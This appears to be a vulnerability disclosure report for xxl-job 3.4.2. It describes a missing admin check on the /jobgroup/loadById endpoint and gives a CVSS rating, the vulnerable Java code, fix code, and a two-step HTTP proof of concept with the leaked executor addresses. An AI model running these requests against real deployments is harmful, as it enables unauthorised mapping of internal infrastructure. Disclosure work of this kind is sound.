#xxl-job v3.4.2 Access Control Bypass via /jobgroup/loadById

---

## Title

**xxl-job 3.4.2 JobGroupController loadById Endpoint Missing Authentication**

---

## Abstract

A vulnerability was found in xxl-job version 3.4.2. The vulnerability affects the `loadById` function of the `JobGroupController` component. The `@XxlSso(role = Consts.ADMIN_ROLE)` authentication annotation is commented out, allowing any authenticated user (including normal users with role=0) to access the endpoint and retrieve executor group information including addresses, appname, and configuration details.

---

## Product

- **Product**: xxl-job
- **Vendor**: xuxueli
- **Website**: https://github.com/xuxueli/xxl-job
- **Affected Version**: 3.4.2
- **Component**: JobGroupController

---

## Classification

| Type | Value |
|------|-------|
| **CVSS** | 4.3 Medium |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N |
| **CWE** | CWE-284 (Improper Access Control) |
| **Attack Vector** | Network |
| **Attack Complexity** | Low |
| **Privileges Required** | Low (Any authenticated user) |
| **User Interaction** | None |
| **Scope** | Unchanged |
| **Confidentiality** | Low |
| **Integrity** | None |
| **Availability** | None |

---

## Introduction

xxl-job is a distributed task scheduling platform widely used in China (10,000+ GitHub stars). In version 3.4.2, the `/jobgroup/loadById` endpoint has its administrator authentication annotation commented out, allowing any authenticated user to retrieve executor group information that should be restricted to administrators.

---

## Vulnerability Details

**File**: `xxl-job-admin/src/main/java/com/xxl/job/admin/business/controller/JobGroupController.java`
**Lines**: 239-245

The `@XxlSso(role = Consts.ADMIN_ROLE)` annotation is commented out on the `/jobgroup/loadById` endpoint. This allows any authenticated user (including normal users with role=0) to access the endpoint and retrieve the full `XxlJobGroup` object.

**Vulnerable Code**:
```java
@RequestMapping("/loadById")
@ResponseBody
//@XxlSso(role = Consts.ADMIN_ROLE)    // COMMENTED OUT - Missing Authentication
public Response<XxlJobGroup> loadById(@RequestParam("id") int id){
    XxlJobGroup jobGroup = xxlJobGroupMapper.load(id);
    return jobGroup!=null?Response.ofSuccess(jobGroup):Response.ofFail();
}
```

**Note**: In v3.4.2, the `XxlJobGroup` model does NOT contain an `accessToken` field (unlike v3.5.0-SNAPSHOT). The leaked information includes:
- `id`: Executor group ID
- `appname`: Application name (e.g., "xxl-job-executor-sample")
- `title`: Group title
- `addressType`: Address type (0=auto-register, 1=manual)
- `addressList`: Executor addresses (e.g., "http://10.48.46.252:9999/")
- `registryList`: List of registered executor addresses

---

## Proof of Concept

### Prerequisites
- Any authenticated user account (role=0 is sufficient)

### Step 1: Authenticate as Normal User

```http
POST /auth/doLogin HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

userName=test&password=test&ifRemember=on
```

**Response**:
```json
{"code":200,"data":null,"msg":"Success","success":true}
```

**Extract Cookie**: `xxl_job_login_token=<session_token>`

### Step 2: Access /jobgroup/loadById

```http
GET /jobgroup/loadById?id=1 HTTP/1.1
Host: target:8080
Cookie: xxl_job_login_token=<session_token>
```

### Response (Normal User Access)

```json
{
  "code": 200,
  "data": {
    "id": 1,
    "appname": "xxl-job-executor-sample",
    "addressList": "http://10.48.46.252:9999/",
    "addressType": 0,
    "title": "通用执行器Sample",
    "registryList": ["http://10.48.46.252:9999/"]
  },
  "msg": "Success",
  "success": true
}
```

**Verified on**: http://10.48.46.252:8080/ (v3.4.2)
**User**: test/test (role=0, normal user)

---

## Impact

An attacker with any authenticated user account can:

1. **Enumerate executor groups**: Obtain all executor group IDs, names, and addresses
2. **Map internal infrastructure**: Discover internal executor server addresses and ports
3. **Identify application names**: Learn the `appname` values used for executor registration
4. **Facilitate further attacks**: Use leaked information to target specific executor servers

**Limitation in v3.4.2**: Unlike v3.5.0-SNAPSHOT, the `XxlJobGroup` model in v3.4.2 does NOT include an `accessToken` field, so this vulnerability does NOT leak authentication tokens. The impact is limited to information disclosure only.

---

## Remediation

### Fix: Restore Authentication on /jobgroup/loadById

```java
@RequestMapping("/loadById")
@ResponseBody
@XxlSso(role = Consts.ADMIN_ROLE)    // RESTORE THIS LINE
public Response<XxlJobGroup> loadById(@RequestParam("id") int id){
    XxlJobGroup jobGroup = xxlJobGroupMapper.load(id);
    return jobGroup!=null?Response.ofSuccess(jobGroup):Response.ofFail();
}
```

### Alternative Fix: Exclude Sensitive Fields for Non-Admin Users

If normal users need to view executor group information, create a separate response model that excludes sensitive fields:

```java
@RequestMapping("/loadById")
@ResponseBody
@XxlSso
public Response<XxlJobGroupPublic> loadById(@RequestParam("id") int id){
    XxlJobGroup jobGroup = xxlJobGroupMapper.load(id);
    if (jobGroup == null) {
        return Response.ofFail();
    }
    // Return only public fields for non-admin users
    XxlJobGroupPublic publicInfo = new XxlJobGroupPublic();
    publicInfo.setId(jobGroup.getId());
    publicInfo.setTitle(jobGroup.getTitle());
    // Exclude addressList, appname, etc.
    return Response.ofSuccess(publicInfo);
}
```

---

## Timeline

| Date | Event |
|------|-------|
| 2026-07-14 | Vulnerability discovered and verified |
| 2026-07-14 | PoC executed successfully |
| 2026-07-14 | VulDB submission |
| TBD | Vendor notification |
| TBD | CVE assignment |

---

## References

- **GitHub Repository**: https://github.com/xuxueli/xxl-job
- **Product Website**: https://www.xuxueli.com/xxl-job/
- **CWE-284**: https://cwe.mitre.org/data/definitions/284.html

---

## Credits

Security researcher

---

## Disclaimer

This vulnerability was discovered during a security audit of the xxl-job project. The information is provided for defensive purposes only. The author is not responsible for any misuse of this information.
